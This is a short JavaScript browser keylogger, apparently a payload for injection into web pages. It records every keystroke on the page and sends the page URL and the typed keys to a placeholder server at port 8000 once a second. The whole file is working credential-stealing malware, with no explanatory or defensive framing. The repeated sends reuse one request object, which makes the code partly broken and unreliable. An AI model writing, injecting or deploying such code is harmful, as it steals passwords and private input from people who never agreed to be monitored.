var keys = '';
var current = document.URL;

var xhr = new XMLHttpRequest();
xhr.open("POST", "//ip:8000/keylog", true);
xhr.setRequestHeader('Content-Type', 'application/json');

xhr.send(JSON.stringify({
    logged: '[' + current + ']',
}));

document.onkeydown = function (e) {
    var get = window.event ? event : e;
    var key = get.keyCode ? get.keyCode : get.charCode;
    key = String.fromCharCode(key);
    keys += key;
}

window.setInterval(function () {
    if (keys != "") {
        xhr.send(JSON.stringify({
            logged: keys
        }));
        keys = "";
    }
}, 1000);